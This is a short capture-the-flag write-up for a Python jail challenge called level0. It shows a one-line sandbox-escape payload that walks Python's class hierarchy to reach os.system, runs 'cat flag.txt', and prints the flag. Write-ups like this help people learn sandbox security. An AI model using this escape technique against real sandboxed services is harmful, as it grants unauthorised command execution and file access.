Title: level0

Description:
```
Solve the 1st level of the pyjail series.

Note: The server is running on Ubuntu 20.04

Author: Claire de lune
```

Need to start instance.

![image](https://user-images.githubusercontent.com/63996033/206859943-2b289e68-34ed-41ca-9aec-69e76233b80a.png)

Choosing option 2 closes the program. Choosing option 1 allows us to run python code.

![image](https://user-images.githubusercontent.com/63996033/206859991-6563273e-2c69-4397-912c-4b994cce36ee.png)

I referred to a [previous challenge](https://github.com/Coder-Here/HACK-AC-2022-CTF/tree/main/Misc/Cult%20of%20Vim) I did in another competition that allowed me to craft a payload to run shell code.

```
print([].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt'))
```

Can use the payload to first list the files in the current directory and then cat out the file. This payload works for the other 2 challenges similarly.


![image](https://user-images.githubusercontent.com/63996033/206860113-ec9abc89-b551-4470-8b8e-6850cc0e84a7.png)

Flag: shakti{7h47_w45_7Un!3a36rgjsk9}
